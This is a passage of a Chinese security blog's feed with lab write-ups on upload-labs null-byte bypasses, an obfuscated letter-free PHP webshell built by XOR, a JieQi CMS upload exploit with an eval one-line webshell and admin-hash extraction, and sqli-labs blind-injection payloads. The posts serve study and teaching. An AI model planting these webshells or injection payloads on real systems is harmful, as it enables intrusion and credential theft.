class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>设置白名单，通过寻找 <code>.</code> 的位置，截取文件名，取出文件后缀，之后与白名单中的后缀做对比。关键问题出在可以设置保存路径上。把 <code>save_name</code> 设置为 <code>/uploads/404.php%00</code>，上传文件名为 <code>404.jpg</code> 后，传至服务器的文件名为 <code>/uploads/404.php%00404.jpg</code>由于<code>windows</code>特性实际上传至服务器的名字为 <code>/uploads/404.php</code>。</p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="先判断上传漏洞类型-2"><a href="#先判断上传漏洞类型-2" class="headerlink" title="先判断上传漏洞类型"></a>先判断上传漏洞类型</h4><p>上传 <code>1.php</code> 文件，观察页面的报错提示。</p><p><img src="/images/121p12_1.png" alt></p><p>上传一个头像，</p><p><img src="/images/121p12_2.png" alt></p><p>此类型为白名单重命名的上传类型。</p><h4 id="根据已知信息构造后缀绕过检测-5"><a href="#根据已知信息构造后缀绕过检测-5" class="headerlink" title="根据已知信息构造后缀绕过检测"></a>根据已知信息构造后缀绕过检测</h4><p>用 <code>burpsuite</code> 抓取数据包，在 <code>Repeater</code> 判断绕过的方法。在 <code>burpsuite</code> 中我们可以发现，<code>save_path</code> 的参数通过 <code>POST</code> 方式发送，所以应该把它转换成 <code>hex</code>。</p><p>把 <code>404.php</code> 保存为 <code>404.jpg</code>，文件内容为 <code>&lt;?php phpinfo();?&gt;</code>。</p><p><img src="/images/121p12_6.png" alt></p><p>上传 <code>404.jpg</code> 文件，</p><p><img src="/images/121p12_7.png" alt></p><p>同时使用 <code>burpsuite</code> 抓包，把 <code>save_path</code> 修改为 <code>../upload/404.php%00</code>，由于 <code>POST</code> 方式并不进行 <code>URL</code> 解码，故转换成十六进制。</p><p><img src="/images/121p12_8.png" alt></p><p>点击 <code>Hex</code>，找到对应的位置做修改，</p><p><img src="/images/121p12_9.png" alt></p><p>返回 <code>Raw</code> 查看，</p><p><img src="/images/121p12_18.png" alt></p><p>未点击 <code>Forward</code> 之前，服务端没有 <code>404.php</code>，</p><p><img src="/images/121p12_19.png" alt></p><p>点击 <code>Forward</code>，上传成功，查看服务端，</p><p><img src="/images/121p12_20.png" alt></p><p>在浏览器中查看图片，</p><p><img src="/images/121p12_21.png" alt></p><p>只留下 <code>404.php</code></p><p><img src="/images/121p12_22.png" alt></p><h4 id="Pass-12-代码分析"><a href="#Pass-12-代码分析" class="headerlink" title="Pass-12 代码分析"></a>Pass-12 代码分析</h4><p>与 <code>Pass-11</code> 主要的不同就是 <code>save_path</code> 传输方式。<code>Pass-11</code> 以 <code>GET</code> 方式传递，<code>Pass-12</code> 以 <code>POST</code> 方式传递。由于 <code>POST</code> 方式不会经过 <code>URL</code> 解码，所以需要在数据包中把 <code>%00</code> 修改为 <code>Hex</code> 方式。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;upload-labs&lt;/code&gt; 中的 &lt;code&gt;Pass-03 - Pass12&lt;/code&gt; 文件后缀解析漏洞。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="upload-labs" scheme="http://yoursite.com/tags/upload-labs/"/>
    
      <category term="文件后缀解析漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>不包含字母和数字的webshell</title>
    <link href="http://yoursite.com/2019/09/11/webshell/"/>
    <id>http://yoursite.com/2019/09/11/webshell/</id>
    <published>2019-09-11T14:06:01.000Z</published>
    <updated>2019-09-12T01:54:33.764Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 分析 <code>webshell</code></p><a id="more"></a><!--export--><!--toc--><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>尝试分析如下 <code>webshell</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++;</span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); </span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); </span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); </span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); </span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在 <code>php</code> 语言中 <code>^</code> 代表异或的意思。 <code>php</code> 是弱类型语言，即使用时可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_++;</span><br><span class="line">$__=(<span class="string">"#"</span> ^ <span class="string">"|"</span>);</span><br><span class="line">    <span class="keyword">echo</span> ($__);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/120webshell1.png" alt></p><p>可以看到输出为 <code>_</code>，原因是 <code>#</code> 的十六进制为 <code>0x23</code>，<code>|</code> 的十六进制为 <code>7C</code>，两者异或的结果为 <code>5F</code>。</p><p><img src="/images/120webshell2.png" alt></p><p><code>ASCII</code> 码 <code>5F</code> 对应的就是 <code>_</code>。</p><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">P</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__= <span class="string">"."</span> ^ <span class="string">"~"</span>;</span><br><span class="line">    $__();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$_++</code> 即为变量 <code>_</code> 的自增运算，在 <code>PHP</code> 未定义的自变量默认值为 <code>NULL</code> ，而 <code>NULL==False==0</code>。</p><p><code>$__=&quot;.&quot; ^ &quot;~&quot;</code> 即把 <code>.</code> 和 <code>~</code> 异或的结果赋值给变量 <code>__</code> ，由第一段程序，我们可以很容易分析得 <code>&quot;.&quot; ^ &quot;~&quot;</code> 的结果为 <code>0x50</code> ，故 <code>__</code> 的值为 <code>P</code>。</p><p><code>$__()</code>变量后面有括号，即调用函数，故会调用函数 <code>P()</code>。</p><p>所以我们可以通过不同符号的异或构造出 <code>$_POST</code> 等字符，从而编写出一个使用数字和字母的 <code>webshell</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++;</span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>);</span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>);</span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/120webshell4.png" alt></p><p>最后一段代码的结果为 <code>$_POST[0]($_POST[1])</code>。</p><p>上面的代码还可以写在一起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++;</span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"."</span>^<span class="string">"~"</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"|"</span>^<span class="string">"/"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>除了用字符还可以用 <code>url</code> 编码实现。</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时需要我们写一个无字母和数字组成的 <code>shell</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">// $_='assert';</span></span><br><span class="line">    $_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); </span><br><span class="line"><span class="comment">// $__='_POST';</span></span><br><span class="line">    $__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>);</span><br><span class="line">    $___=$$__;</span><br><span class="line"><span class="comment">// assert($_POST[_]);</span></span><br><span class="line">    $_($___[_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/shell.php?shell=<span class="variable">$_</span>=(%27%01%27^%27`%27).(%27%13%27^%27`%27).(%27%13%27^%27`%27).(%27%05%27^%27`%27).(%27%12%27^%27`%27).(%27%14%27^%27`%27);<span class="variable">$__</span>=%27_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p>其中 <code>shell=$_=assert</code>，<code>$__=_POST</code> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/shell.php?shell=<span class="variable">$_</span>=assert;<span class="variable">$__</span>=_POST;<span class="variable">$___</span>=<span class="variable">$_POST</span>;assert(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><p><img src="/images/120webshell5.png" alt></p><p><em>参考文章</em></p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p>[<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 分析 &lt;code&gt;webshell&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>非法文件上传漏洞技术解析及防御</title>
    <link href="http://yoursite.com/2019/09/11/illegal-upload/"/>
    <id>http://yoursite.com/2019/09/11/illegal-upload/</id>
    <published>2019-09-11T10:32:53.000Z</published>
    <updated>2019-09-12T00:28:19.283Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 掌握杰奇 <code>CMS</code> 上传漏洞的利用方法，了解如何对此漏洞进行修复。</p><p><strong>实验工具</strong>：中国菜刀 + <code>Firebug</code></p><a id="more"></a><!--export--><!--toc--><h3 id="非法文件上传漏洞"><a href="#非法文件上传漏洞" class="headerlink" title="非法文件上传漏洞"></a>非法文件上传漏洞</h3><h4 id="定位文件上传漏洞"><a href="#定位文件上传漏洞" class="headerlink" title="定位文件上传漏洞"></a>定位文件上传漏洞</h4><p>用浏览器打开网页 <code>www.test.com</code>，先注册用户，注册成功后，用该用户登录，用户首页如下：</p><p><img src="/images/199jieqi1.png" alt></p><p>可以看到，用户头像为默认，故首先定位到用户上传头像功能。点击 <code>个人资料</code>，进入 <code>userdetail.php</code>，页面显示如下：</p><p><img src="/images/199jieqi2.png" alt></p><p>判断用户在设置头像这里是否存在文件上传漏洞。</p><p><img src="/images/199jieqi3.png" alt></p><p>在桌面上新建一个名为 <code>shell.php</code> 的文件，写入一句话木马。再复制一份，命名为 <code>shell.jpg</code> 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在 <code>C:\Tools\抓包改包\Burp Suite</code> 中打开 <code>burp</code> ，设置浏览器为手动代理。</p><p><img src="/images/199jieqi4.png" alt></p><p>用 <code>burpsuite</code> 抓取上传 <code>shell.jpg</code> 的数据包，然后发送到 <code>Repeater</code>，然后在 <code>Repeater</code> 做各种尝试，查看 <code>Response</code>。</p><p>把文件后缀修改为 <code>.php</code>，文件上传不成功。因此尝试寻找其他位置。</p><p><img src="/images/199jieqi6.png" alt></p><p>在<code>我的空间</code>找到了上传相册功能，尝试在这里进行文件上传。</p><p><img src="/images/199jieqi7.png" alt></p><h4 id="三种方法绕过检测"><a href="#三种方法绕过检测" class="headerlink" title="三种方法绕过检测"></a>三种方法绕过检测</h4><h5 id="删除函数绕过"><a href="#删除函数绕过" class="headerlink" title="删除函数绕过"></a>删除函数绕过</h5><p>在上传相册页面，点击 <code>浏览</code> 选择 <code>shell.php</code> ，尝试在代码中找到前端 <code>js</code> 检测的代码。</p><p><img src="/images/199jieqi8.png" alt></p><p>发现 <code>form</code> 表单，提交时调用了 <code>checkFile()</code> 函数，直接把它删掉，</p><p><img src="/images/199jieqi10.png" alt></p><p>点击上传，发现上传成功。</p><p><img src="/images/199jieqi11.png" alt></p><h5 id="抓包绕过"><a href="#抓包绕过" class="headerlink" title="抓包绕过"></a>抓包绕过</h5><p>用 <code>burpsuit</code>抓包方法绕过，点击浏览，选择 <code>shell.jpg</code> 文件，点击上传。</p><p><img src="/images/199jieqi12.png" alt></p><p>在 <code>burp</code> 界面把文件后缀名改为 <code>.php</code> 。</p><p><img src="/images/199jieqi13.png" alt></p><p>发现上传成功。</p><h5 id="禁止-JS-功能绕过"><a href="#禁止-JS-功能绕过" class="headerlink" title="禁止 JS 功能绕过"></a>禁止 JS 功能绕过</h5><p>选中 <code>Disable JavaScript</code>，可以上传 <code>.php</code> 文件。</p><p><img src="/images/199jieqi26.png" alt></p><p><img src="/images/199jieqi14.png" alt></p><h4 id="使用中国菜刀"><a href="#使用中国菜刀" class="headerlink" title="使用中国菜刀"></a>使用中国菜刀</h4><p>打开菜刀，填写地址和密码，选择 <code>php</code> 脚本了类型。</p><p><img src="/images/199jieqi15.png" alt></p><p>添加成功后，选择文件目录，成功打开。</p><p><img src="/images/199jieqi16.png" alt></p><p>找到系统盘根目录下的 <code>flag</code> 文件。</p><p><img src="/images/199jieqi17.png" alt></p><p>双击打开文件。</p><p><img src="/images/199jieqi18.png" alt></p><p>返回主界面，右击选择数据库管理，</p><p><img src="/images/199jieqi19.png" alt></p><p>点击配置，填写如下内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt;MYSQL&lt;/T&gt;</span><br><span class="line">&lt;H&gt;localhost&lt;/H&gt;</span><br><span class="line">&lt;U&gt;root&lt;/U&gt;</span><br><span class="line">&lt;P&gt;root&lt;/P&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/199jieqi20.png" alt></p><p>点击提交，成功连接数据库。</p><p><img src="/images/199jieqi21.png" alt></p><p>发现 <code>testjie</code> 数据库，找到该库下的表 <code>jieqi_system_users</code>。</p><p><img src="/images/199jieqi23.png" alt></p><p>在输入框输入，如下 <code>SQL</code> 语句，点击执行，成功获取 <code>admin</code> 的密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM jieqi_system_users WHERE name=&apos;admin&apos;;</span><br></pre></td></tr></table></figure><p><img src="/images/199jieqi24.png" alt></p><p>用在线的 <code>MD5</code> 解密工具解密。</p><p><img src="/images/199jieqi25.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 掌握杰奇 &lt;code&gt;CMS&lt;/code&gt; 上传漏洞的利用方法，了解如何对此漏洞进行修复。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实验工具&lt;/strong&gt;：中国菜刀 + &lt;code&gt;Firebug&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs 学习笔记</title>
    <link href="http://yoursite.com/2019/09/10/sqli-labs/"/>
    <id>http://yoursite.com/2019/09/10/sqli-labs/</id>
    <published>2019-09-10T00:06:14.000Z</published>
    <updated>2019-09-11T10:30:31.585Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 掌握 <code>sqli-labs</code> 每个关卡的注入原理，熟练使用手工注入和<code>sqlmap</code> 工具的使用，对源代码进行简单分析。</p><a id="more"></a><!--export--><!--toc--><h3 id="SQL-注入常用语句"><a href="#SQL-注入常用语句" class="headerlink" title="SQL 注入常用语句"></a><code>SQL</code> 注入常用语句</h3><h4 id="information-schema-表的应用"><a href="#information-schema-表的应用" class="headerlink" title="information_schema 表的应用"></a><code>information_schema</code> 表的应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查询库名</span><br><span class="line">SELECT schema_name FROM information_schema.schemata</span><br><span class="line"># 查询表名</span><br><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;库名&apos;</span><br><span class="line"># 查询列名</span><br><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&apos;表名&apos; AND table_schema=&apos;库名&apos;</span><br><span class="line"># 取出相应的数据</span><br><span class="line">SELECT col1,col2 FROM `库名`.`表名`</span><br></pre></td></tr></table></figure><h4 id="UNION-SELECT-联合查询"><a href="#UNION-SELECT-联合查询" class="headerlink" title="UNION SELECT 联合查询"></a><code>UNION SELECT</code> 联合查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 先确定字段数</span><br><span class="line">ORDER BY 1,2,3,...,N</span><br><span class="line"># 联合查询，确定页面能显示的位置</span><br><span class="line">UNION SELECT 1,2,3,user(),version(),...,N</span><br><span class="line"># 把要查询的 SQL 语句放在相应位置</span><br><span class="line">UNION SELECT 1,2,3,/*放相应的 SQL 语句*/,5</span><br></pre></td></tr></table></figure><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AND length(database()) &gt; 0;</span><br><span class="line">AND substr(database(), 1, 1)=&apos;t&apos;</span><br><span class="line">AND ascii(substr(database(), 1, 1)) &gt; 0</span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># if 函数</span><br><span class="line">AND if(bool, exp1, exp2) # bool 为真，则执行 exp1，为假则执行 exp2</span><br></pre></td></tr></table></figure><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><ol><li>打开首页如下图</li></ol><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_1.png" alt></p><ol start="2"><li>在查看器中找到 <code>form</code> 表单的名称</li></ol><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_2.png" alt></p><ol start="3"><li>使用 <code>HackBar</code> 以 <code>POST</code> 方式提交数据，随意输入用户名和密码，可以看出，页面提示登录失败。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_3.png" alt></p><ol start="4"><li>尝试使用万能密码登录，</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' or 1 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_4.png" alt></p><p>可以看出登录成功。故我们可以利用用户名这块进行 <code>sql</code> 注入。找到注入点后，接下来我们来分析下到底该有哪种注入方式，首先，无论用户是否登录成功，页面均没有可用的数据以及数据库报错显示出来，所以 <code>UNION SELECT</code> 和报错注入显然是不合适的。根据登录成功与否显示的图片不同，故可以使用布尔盲注。</p><p>布尔盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' and ascii(mid((select user()), 1, 1))&gt;0 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p>运用 <code>ascii</code> 和 <code>mid</code> 函数时，第一次应该先于 <code>0</code> 比较，因为这样能尽快判断出写入的语句是否存在错误，避免浪费过多时间。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_6.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' and ascii(mid((select user()), 1, 1))&gt;120 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_5.png" alt></p><p>规范的做法应该是，第一步先用 <code>count</code> 判断库/表/字段个数，第二步是用 <code>limit</code> 控制把库/表/字段一一输出，然后用 <code>length</code> 判断每个名的长度，第三步用 <code>ascii</code> 和 <code>mid</code> 一一判断名中每个字符的大小。</p><p>时间盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(length(user())&gt;1, sleep(1), 1) <span class="comment">#&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_7.png" alt></p><p>可以看出，点击 <code>Execute</code> 后，页面等待一段时间后，显示登录错误，当我们把数字改到 <code>14</code> 后，点击 <code>Execute</code> ，页面立刻执行完毕，显示登录成功。其中原因是 <code>length(user())</code> 的输出为 <code>14</code>，当 <code>&gt;</code> 后面的数字小于 <code>14</code> 时，<code>if()</code> 函数执行 <code>sleep(1)</code> ，之后返回 <code>0</code>，然后执行如下的 <code>sql</code> 语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos; and 0 # and password=123 LIMIT 0,1</span><br></pre></td></tr></table></figure><p>后面是永假条件，此时的 <code>SQL</code> 语句返回空。反之，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos; and 1 # and password=123 LIMIT 0,1</span><br></pre></td></tr></table></figure><h4 id="源码分析"><a href="#源码分析" class="headerlink" 